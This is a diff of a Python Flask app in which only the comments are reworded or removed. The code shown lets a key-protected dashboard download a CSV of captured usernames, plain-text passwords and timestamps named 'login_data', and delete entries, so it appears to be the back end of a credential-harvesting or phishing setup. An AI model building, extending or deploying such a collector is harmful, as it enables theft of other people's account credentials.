@@ -453,12 +453,12 @@ def download_csv(access_key):
     if access_key != STATS_ACCESS_KEY:
         return "Access denied", 403
     
-    # Check if user is authenticated for dashboard
+    # check if user is authenticated for dashboard
     if 'dashboard_auth' not in session:
         # If not authenticated, redirect to dashboard login
         return redirect(url_for('dashboard_login', access_key=access_key))
     
-    # Try to find the data file in various locations
+    # try to find the data file in various locations
     possible_paths = [
         os.path.join(os.path.dirname(os.path.abspath(__file__)), 'data.csv'),
         os.path.join('/tmp', 'data.csv'),
@@ -474,35 +474,28 @@ def download_csv(access_key):
     if not csv_path:
         return "No data available", 404
     
-    # Create a temporary file for download with plain text passwords
+    # create a temporary file for download with plain text passwords
     temp_csv_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'temp_download.csv')
     
     try:
-        # Read the original data
         with open(csv_path, 'r') as csvfile:
             reader = csv.DictReader(csvfile)
             rows = list(reader)
         
-        # Create new file with only the required fields
         with open(temp_csv_path, 'w', newline='\n') as csvfile:
             writer = csv.writer(csvfile)
             
-            # Write the header with only the required fields
             writer.writerow(['username', 'password', 'timestamp'])
             
-            # Write data with only the required fields (keep password as plain text)
             for row in rows:
                 username = row.get('username', '')
-                password = row.get('password', '')  # Keep password as plain text for CSV
-                timestamp = row.get('timestamp', '')  # Keep timestamp as is
+                password = row.get('password', '')  
+                timestamp = row.get('timestamp', '') 
                 
-                # Include only the username, password (as plain text), and timestamp
                 writer.writerow([username, password, timestamp])
         
-        # Set the appropriate headers for CSV download
         filename = f"login_data_{datetime.now().strftime('%Y%m%d_%H%M%S')}.csv"
         
-        # Send the temporary file
         response = send_file(
             temp_csv_path,
             mimetype='text/csv',
@@ -510,7 +503,7 @@ def download_csv(access_key):
             download_name=filename
         )
         
-        # Clean up temp file after response is sent
+        # clean up temp file after response is sent
         @response.call_on_close
         def cleanup():
             if os.path.exists(temp_csv_path):
@@ -530,18 +523,18 @@ def download_csv(access_key):
                 pass
         return f"Error: {str(e)}", 500
 
-# Add a route to delete a specific entry
+# routing to delete a specific entry
 @app.route('/delete-entry/<access_key>/<int:entry_index>', methods=['DELETE'])
 def delete_entry(access_key, entry_index):
     if access_key != STATS_ACCESS_KEY:
         return "Access denied", 403
     
-    # Check if user is authenticated for dashboard
+    # inspect if user is authenticated for dashboard
     if 'dashboard_auth' not in session:
-        # If not authenticated, return auth error
+        # not authenticated then, return auth error
         return "Authentication required", 401
     
-    # Try to find the data file in various locations
+    # dig the data file in various locations
     possible_paths = [
         os.path.join(os.path.dirname(os.path.abspath(__file__)), 'data.csv'),
         os.path.join('/tmp', 'data.csv'),
@@ -558,25 +551,24 @@ def delete_entry(access_key, entry_index):
         return "No data available", 404
     
     try:
-        # Read all data
         all_data = []
         with open(csv_path, 'r') as csvfile:
             reader = csv.reader(csvfile)
             all_data = list(reader)
         
-        # Check if the index is valid
-        if entry_index < 0 or entry_index >= len(all_data) - 1:  # -1 for header
+        # check if the index is valid
+        if entry_index < 0 or entry_index >= len(all_data) - 1: 
             return "Invalid entry index", 400
         
-        # Remove the entry (add 1 to skip header)
+        # remove the entry (add 1 to skip header)
         del all_data[entry_index + 1]
         
-        # Write back the updated data
+        # write back the updated data
         with open(csv_path, 'w', newline='\n') as csvfile:
             writer = csv.writer(csvfile)
             writer.writerows(all_data)
         
-        # Update the last modified timestamp
+        # update the last modified timestamp
         update_last_modified_timestamp()
         
         return "Entry deleted successfully", 200
@@ -585,18 +577,17 @@ def delete_entry(access_key, entry_index):
         print(f"Error deleting entry: {str(e)}")
         return f"Error: {str(e)}", 500
 
-# Add a route to delete all entries
+# routing to delete all entries
 @app.route('/delete-all/<access_key>', methods=['DELETE'])
 def delete_all(access_key):
     if access_key != STATS_ACCESS_KEY:
         return "Access denied", 403
     
-    # Check if user is authenticated for dashboard
+    # validate if user is authenticated for dashboard
     if 'dashboard_auth' not in session:
-        # If not authenticated, return auth error
+        # if not authenticated then, return auth error
         return "Authentication required", 401
     
-    # Try to find the data file in various locations
     possible_paths = [
         os.path.join(os.path.dirname(os.path.abspath(__file__)), 'data.csv'),
         os.path.join('/tmp', 'data.csv'),
@@ -613,17 +604,17 @@ def delete_all(access_key):
         return "No data available", 404
     
     try:
-        # Keep only the header row
+        # just keep the header function
         with open(csv_path, 'r') as csvfile:
             reader = csv.reader(csvfile)
-            header = next(reader)  # Get header row
+            header = next(reader)  
         
-        # Write back only the header
+        # print back only the header
         with open(csv_path, 'w', newline='\n') as csvfile:
             writer = csv.writer(csvfile)
             writer.writerow(header)
         
-        # Update the last modified timestamp
+        # update the last modified timestamp
         update_last_modified_timestamp()
         
         return "All entries deleted successfully", 200
@@ -632,18 +623,18 @@ def delete_all(access_key):
         print(f"Error deleting all entries: {str(e)}")
         return f"Error: {str(e)}", 500
 
-# Add a logout route for the dashboard
+# logout route for the dashboard
 @app.route('/dashboard-logout/<access_key>')
 def dashboard_logout(access_key):
-    # Remove dashboard authentication from session
+    # remove dashboard authentication from session
     session.pop('dashboard_auth', None)
-    # Redirect to dashboard login
+    # redirect to dashboard login
     return redirect(url_for('dashboard_login', access_key=access_key))
 
 if __name__ == '__main__':
-    #run server 
+    
     app.run(
         host='0.0.0.0',  
-        port=5000,       # You can change this port if needed. do not remove for handling port.
-        debug=False      # set to False for production. do not remove this.
+        port=5000,       
+        debug=False      
     ) 
